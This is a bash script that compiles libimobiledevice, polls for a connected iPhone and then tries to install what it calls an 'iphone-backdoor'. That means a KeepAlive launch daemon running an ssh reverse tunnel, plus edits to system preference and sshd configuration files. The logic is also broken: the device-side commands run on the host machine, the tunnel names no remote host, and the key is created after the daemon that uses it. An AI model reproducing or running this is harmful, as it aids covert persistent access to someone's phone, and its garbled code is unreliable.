#!/bin/bash



set -euo pipefail

# Function to compile libimobiledevice
compile_libimobiledevice() {
    # Navigate to a temporary directory
    cd "$(mktemp -d)" || exit
    
    # Clone libimobiledevice from GitHub
    git clone https://github.com/libimobiledevice/libimobiledevice.git
    
    # Navigate into the libimobiledevice directory
    cd libimobiledevice || exit
    
    # Compile and install libimobiledevice
    ./autogen.sh
    make
    sudo make install
    
    # Ensure ldconfig is run to update shared library cache
    sudo ldconfig
    
    # Return to the original directory
    cd -
}

# Function to connect to the Apple device
connect_to_device() {
    # Assuming you have a valid method to determine the unique identifier
    # For demonstration, setting a placeholder value
    unique_identifier="unique-identifier-placeholder"
    
    user_home="/var/mobile/Containers/Data/Application/$unique_identifier"
    ssh_binary_path="$user_home/ssh"
    launch_daemon_path="/Library/LaunchDaemons/com.example.ssh.plist"
    ssh_key_path="$user_home/id_rsa"
    ssh_config_dir="/etc/ssh/sshd_config.d"
    ssh_config_file="$ssh_config_dir/99-iphone-backdoor.conf"
    
    # Create a new user on the iPhone (this step is actually not creating a new user but setting a preference)
    defaults write /var/mobile/Library/Preferences/com.apple.mobile.installation.plist userhome_uid 501
    
    # Create a folder in the user's home directory
    mkdir -p "$user_home"
    
    # Copy the SSH binary to that folder
    cp /usr/bin/ssh "$ssh_binary_path"
    
    # Change permissions for the binary
    chmod +x "$ssh_binary_path"
    
    # Create a launch daemon to run the binary
    cat << EOF > "$launch_daemon_path"
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.example.ssh</string>
        <key>ProgramArguments</key>
        <array>
            <string>$ssh_binary_path</string>
            <string>-i</string>
            <string>$ssh_key_path</string>
            <string>-p</string>
            <string>2222</string>
            <string>-R</string>
            <string>8080:localhost:22</string>
        </array>
        <key>KeepAlive</key>
        <true/>
        <key>RunAtLoad</key>
        <true/>
        <key>UserName</key>
        <string>mobile</string>
    </dict>
    </plist>
    EOF
    
    # Load the launch daemon
    launchctl load -w "$launch_daemon_path"
    
    # Create the SSH key
    ssh-keygen -t rsa -b 4096 -f "$ssh_key_path" -N ""
    
    # Ensure the SSH config directory exists
    mkdir -p "$ssh_config_dir"
    
    # Create a new SSH config file
    cat << EOF > "$ssh_config_file"
    PasswordAuthentication no
    EOF
    
    # This assumes that the Include directive is not already present in your sshd_config
    if ! grep -qxF 'Include /etc/ssh/sshd_config.d/*.conf' /etc/ssh/sshd_config; then
        echo "Include /etc/ssh/sshd_config.d/*.conf" >> /etc/ssh/sshd_config
    fi
    
    # Restart the SSH daemon (this command might need adjustment based on your system)
    # For example, on a system using launchd for OpenSSH, you might reload the service like this:
    launchctl stop com.openssh.sshd
    launchctl start com.openssh.sshd
}

# Function to monitor USB connections for the Apple device
monitor_usb_connections() {
    while true; do
        connected_devices=$(idevice_id -l | wc -l)
        if [ "$connected_devices" -gt 0 ]; then
            echo "iPhone connected. Establishing SSH connection..."
            connect_to_device
            echo "SSH connection established successfully."
            break
        fi
        sleep 5  # Check every 5 seconds
    done
}

# Function to display usage
usage() {
    echo "Usage: sudo $0 --h"
    echo "Options:"
    echo "  --h       Display this help message"
    exit 1
}

# Function for error handling and logging
handle_error() {
    echo "Error: $1"
    echo "$(date): Error - $1" >> "$log_file"
    exit 1
}

# Function to set up logging
setup_logging() {
    log_file="/var/log/iphone_ssh.log"
    touch "$log_file" || handle_error "Failed to create log file."
    echo "$(date): Starting iPhone SSH script" >> "$log_file"
}

# Check if script is executed as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root."
    exit 1
fi

# Parse command line options
while [[ $# -gt 0 ]]; do
    case $1 in
        --h)
            usage
            ;;
        *)
            echo "Invalid option: $1"
            usage
            ;;
    esac
done

# Main script starts here

# Set up logging
setup_logging

# Compile libimobiledevice if not already installed
if ! command -v idevice_id &>/dev/null; then
    echo "Compiling libimobiledevice..."
    compile_libimobiledevice || handle_error "Failed to compile libimobiledevice."
    echo "libimobiledevice compiled successfully."
fi

# Start monitoring USB connections
monitor_usb_connections

# End of script
echo "$(date): iPhone SSH script completed successfully." >> "$log_file"
exit 0